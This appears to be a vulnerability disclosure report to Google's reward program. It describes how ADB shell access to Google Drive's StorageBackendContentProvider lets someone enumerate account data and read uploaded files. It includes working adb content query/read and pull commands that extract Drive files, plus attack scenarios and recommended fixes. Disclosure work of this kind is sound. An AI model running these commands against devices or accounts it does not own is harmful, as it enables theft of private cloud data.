# VRP Report 17: Google Drive StorageBackendContentProvider — Full Cloud Data Exfiltration via ADB Shell

## Vulnerability Summary

Google Drive's `StorageBackendContentProvider` (authority: `com.google.android.apps.docs.storage`) declares `android.permission.MANAGE_DOCUMENTS` (signature-level) as its protection permission, yet ADB shell can fully access it via `ContentProviderExternal`. This allows complete enumeration of Google Drive metadata (account email, folder structure, file names, sizes, document IDs, timestamps) and **full content extraction** of uploaded files — effectively exfiltrating cloud data through a local device interface.

**Application:** Google Drive (`com.google.android.apps.docs`)  
**Component:** `StorageBackendContentProvider`  
**Authority:** `com.google.android.apps.docs.storage`  
**Declared Permission:** `android.permission.MANAGE_DOCUMENTS` (signature|privileged)  
**Impact:** Confidentiality — Complete Google Drive data exfiltration via ADB  
**Severity:** Medium (requires ADB access / USB debugging)

## Device & Environment

- **Device:** Google Pixel 6a (26131JEGR04733)
- **OS:** Android 17 (API 37)
- **Build:** CP2A.260605.012
- **Google Drive:** Latest Play Store version (as of 2026-09-07)
- **Account:** sandiyotest@gmail.com

## Technical Details

### Manifest Declaration

```xml
<provider
    android:name="com.google.android.apps.docs.storagebackend.StorageBackendContentProvider"
    android:exported="true"
    android:permission="android.permission.MANAGE_DOCUMENTS"
    android:authorities="com.google.android.apps.docs.storage"
    android:grantUriPermissions="true" />
```

`MANAGE_DOCUMENTS` is a signature-level permission (protection level: `signature|privileged`). Regular apps cannot hold it. However, ADB shell accesses content providers through `ContentProviderExternal`, which bypasses the standard permission enforcement.

### Why This Matters

ADB shell has file system access permissions (`MANAGE_EXTERNAL_STORAGE`, `READ/WRITE_EXTERNAL_STORAGE`) — these grant access to **local** files only. ADB access should NOT grant access to **cloud-stored** data. The Drive StorageBackendContentProvider bridges local and cloud storage, and its inadequate access control allows ADB to read Google Drive content stored in Google's cloud servers.

## Proof of Concept

### Step 1: Account & Root Enumeration

```bash
adb shell content query --uri \
  "content://com.google.android.apps.docs.storage/root"
```

**Result:**
```
document_id=acc=1;0, _display_name=sandiyotest@gmail.com
```

Exposes: Google account email address.

### Step 2: Drive Structure Enumeration

```bash
adb shell content query --uri \
  "content://com.google.android.apps.docs.storage/tree/acc%3D1%3B0/document/acc%3D1%3Bview%3Dmydrive/children"
```

**Result — 21 items including:**

| # | Name | Type | Size | Last Modified |
|---|------|------|------|---------------|
| 0 | appsheet | directory | — | 2022-06-30 |
| 1 | aws | directory | — | 2024-06-13 |
| 2 | bug bounty | directory | — | 2024-02-22 |
| 3 | burp && java | directory | — | 2022-09-22 |
| 7 | dev/soc/exploit | directory | — | 2024-07-21 |
| 13 | Untitled document | Google Doc | 1024 | 2026-07-18 |
| 16 | Web portal 1-IV YEAR CSE B- final.xlsx | Excel | 5119 | 2026-07-30 |
| 18 | websiteregister-rijksoverheid-2024-05-30 | Google Sheet | 72356 | 2024-07-03 |
| 20 | Write the detail documentation on prompt injection vulnerability | Google Doc | 2723 | 2023-05-22 |

All 21 items with full metadata (document IDs, MIME types, timestamps, sizes).

### Step 3: File Content Exfiltration

```bash
# Read file content directly
adb shell "content read --uri \
  'content://com.google.android.apps.docs.storage/document/acc%3D1%3Bdoc%3Dencoded%3DzVZcVGhVICItHSNHjt1RiraPq2S7JpfQxrZ0xb0eDUXPtkGSKYp0L-o%3D' \
  > /data/local/tmp/drive_exfil_test.xlsx"

# Verify file on device
adb shell ls -la /data/local/tmp/drive_exfil_test.xlsx
# -rw-rw-rw- 1 shell shell 5119 2026-09-07 01:26

# Pull to attacker machine
adb pull /data/local/tmp/drive_exfil_test.xlsx ./exfiltrated.xlsx
# 5119 bytes — valid Microsoft Excel 2007+ file

file ./exfiltrated.xlsx
# Microsoft Excel 2007+
```

The file size (5119 bytes) exactly matches the metadata-reported size, confirming complete content retrieval. The file is a valid XLSX containing worksheet data, styles, and shared strings.

### Step 4: Recursive Folder Enumeration

Sub-folders can be enumerated by navigating tree URIs:
```
content://com.google.android.apps.docs.storage/tree/acc%3D1%3B0/document/<encoded_folder_id>/children
```

### Step 5: Regular App Access Blocked (Confirmed)

A zero-permission PoC app was built and tested. Result: the `ContentResolver` returns null — the provider is not visible to regular apps lacking `MANAGE_DOCUMENTS`. Shell access works via `ContentProviderExternal` system mechanism.

## Data Exposed

| Category | Data | Proven |
|----------|------|--------|
| Account Identity | Google account email (sandiyotest@gmail.com) | ✅ |
| Folder Structure | All Drive folder names and hierarchy | ✅ |
| File Metadata | Names, sizes, MIME types, timestamps, document IDs | ✅ |
| File Contents | Full binary content of uploaded files (XLSX, etc.) | ✅ |
| Google Docs | Listed with metadata (content is "virtual" — not directly readable) | ✅ Partial |
| Google Sheets | Listed with metadata and sizes | ✅ |

## Attack Scenarios

1. **USB Attack / Charging Station:** An attacker with physical access to a device with USB debugging enabled can silently enumerate and exfiltrate all Google Drive content without unlocking the device (if ADB is authorized).

2. **Post-Exploitation Escalation:** Any local privilege escalation vulnerability that grants shell-level access immediately escalates to full Google Drive data theft — converting a local exploit into cloud data exfiltration.

3. **Corporate Espionage:** An insider with temporary physical access to a developer's device can extract all Drive documents, spreadsheets, and files in seconds.

4. **ADB Persistence:** Malware that gains ADB authorization (e.g., through social engineering to enable USB debugging) can continuously monitor and exfiltrate Drive content.

## Root Cause

The `StorageBackendContentProvider` relies solely on the `android.permission.MANAGE_DOCUMENTS` declaration for access control. While this effectively blocks regular apps, it does not account for shell-level access through `ContentProviderExternal`, which Android allows for debugging purposes but which should not extend to cloud-stored data.

The provider should implement additional caller verification beyond manifest-level permission declarations, particularly for operations that access cloud-stored data.

## Recommended Fix

1. Implement caller UID validation in the provider's `query()` and `openFile()` methods
2. Reject access from shell UID (2000) for cloud data operations
3. Require additional authentication for cloud data access beyond `MANAGE_DOCUMENTS`
4. Consider separating local cache access from cloud API access in the provider

## Timeline

- **2026-09-07:** Vulnerability discovered and proven on Pixel 6a, Android 17
